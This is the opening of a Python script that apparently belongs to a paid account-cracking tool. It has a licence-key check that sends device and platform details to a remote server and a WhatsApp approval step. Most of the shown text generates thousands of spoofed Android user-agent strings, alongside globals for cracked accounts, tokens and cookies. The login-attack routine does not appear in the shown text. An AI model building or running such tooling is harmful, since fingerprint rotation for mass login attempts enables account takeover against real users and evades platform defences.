#------------->> IMPORT >>-------------#
try:
    import os
    import requests
    import json
    import time
    import re
    import random
    import sys
    import uuid
    import mechanize
    import string
    import subprocess
    import bs4
    import urllib3
    import rich
    import base64
    import platform
    import httplib2
    import arrow
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
    from datetime import datetime
except ModuleNotFoundError as e:
    print(f'>> MISSING MODULE: {e}')
    print('>> INSTALLING MISSING MODULES....! ')
    # Try to install missing modules
    try:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "bs4", "rich", "urllib3", "httplib2", "arrow"])
        print('>> MODULES INSTALLED SUCCESSFULLY!')
        # Restart script
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except:
        print('>> FAILED TO INSTALL MODULES. PLEASE INSTALL MANUALLY:')
        print('>> pip install requests bs4 rich urllib3 httplib2 arrow')
        exit()

# Check if critical modules are imported
required_modules = ['sys', 'requests', 'bs4', 'tred', 'platform', 'httplib2', 'arrow']
for module in required_modules:
    if module not in dir():
        print(f'>> CRITICAL ERROR: {module} module not imported!')
        exit()

#------------->> KEY SYSTEM >>-------------#
def getKey():
    myid = str(os.getuid())
    myid = myid.upper()[::-1]
    n = re.findall("(\\d\\d)", myid)
    plat = platform.version()[2:][:8][::-1].upper() + platform.release()[3:][::-1].upper() + platform.version()[:2]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    return "GEN-" + myid + xp

def line():
    print('----------------------------------------------')

def subscription(message):
    clear()
    key = getKey()
    print(f"\033[1;97m [•] YOUR KEY   :  " + key)
    line()
    print(f'\033[1;97m [•] THIS TOOL IS PAID')
    print(f'\033[1;97m [•] YOU NEED TO APROVAL')
    line()
    xh = input(f'\033[1;97m [•] PRESS ENTER FOR SEND YOUR KEY')
    if xh in ["Trail", "trail"]:
        trk.append('Trail')
        On()
    clear()
    uname = input(f'\033[1;97m [•] ENTER YOUR NAME : ')
    tsk = "Hi Sir GEN! I Need To Aproval For Your Paid Tool So Please Approve My Key-:)\n\nName : " + uname + " \nKey : " + key
    subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+2348138189727&text=" + tsk])
    time.sleep(2)
    On()

trk = []

def On():
    try:
        clear()
        if "Trail" in trk:
            print(" Put Your Trail Key Bellow! ")
            line()
            key = input(' Put Key: ')
        else:
            key = getKey()
            
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'}
        params = {'key': key, 'device': platform.platform()}
        url = "https://itsngr.serv00.net/checkpzh.php"
        
        http_obj = httplib2.Http()
        response, content = http_obj.request(
            uri=url + "?" + "&".join([f"{k}={v}" for k, v in params.items()]),
            method="GET",
            headers=headers
        )
        
        response = content.decode('utf-8')
        if "error" in response:
            if "Key has expired" in response:  
                subscription("\033[1;97m [•] Your Key Has Been Expired! ")
            else:
                subscription("\033[1;97m [•] You're Not Premium User ")
        elif "user" in response:
            result = json.loads(response)
            try:
                name = result['name']
            except:
                name = '-'
            user = result['user']
            exp = result['expired']
            join = result['joined']
            
            # Calculate days remaining
            date_today = arrow.now().format('YYYY-MM-DD')
            a = arrow.get(date_today)
            b = arrow.get(exp)
            delta = (b - a).days
            
            # If key is valid, start the main menu
            Menu()
        else:
            On()
    except Exception as e:
        print(f"\033[1;97m [•] Error: {e}")
        time.sleep(1)
        exit()

#------------->> LOOP >>-------------#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];user=[];plist=[];pookie=[];ugen=[];show_cookies=[]
#------------------[ DATE ]-----------------#
dateti = str(datetime.now()).split(' ')[0]
#------------->> GENE >>-------------#
ugen=[]
for xd in range(10000):
	rr = random.randint
	build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
	bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
	oppo = random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
	infinix = random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
	redmi = random.choice(["2211133G","M2004J19C","22041219I","22101316UG","2209116AG","M2010J19SY","M2012K11C","Redmi Note 7","Redmi Note 8","Redmi Note 5"])
	um2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {oppo} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
	um1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {redmi} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
	um3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
	um4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,114))}.0.{str(rr(4900,5700))}.{str(rr(70,150))} Mobile Safari/537.36"
	ugen.append(um2)
	ugen.append(um3)
	ugen.append(um1)
	ugen.append(um4)
for xhd in range(1000):
	a = random.choice(['de-at','in-id','ms-my','uk-ua','en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr','en-au','th-th','hi-in','zh-tw','my-zg','en-nz','en-ca','es-mx','ko-kr','el-gr','en-ez','ar-ae','fr-ch','nl-nl','gu-in'])
	b = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	c = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	b2 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	c2 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	d = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(6,14))}; {a}; OPPO {b}{str(random.randint(10,99))}{c} Build/{b2}{str(random.randint(1,999))}{c2}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,117))}.0.{str(random.randint(2500,5900))}.{str(random.randint(80,200))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(6,47))}.{str(random.randint(7,8))}.{str(random.randint(2,40))}.{str(random.randint(1,9))}"
	ugen.append(d)
for xd in range(1000):
   rr = random.randint; rc = random.choice
   aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
   lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
   build_nokiax = ['JDQ39','JZO54K']
   oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
   redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
   realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
   infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
   samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ","G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B","S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
   gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
   strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
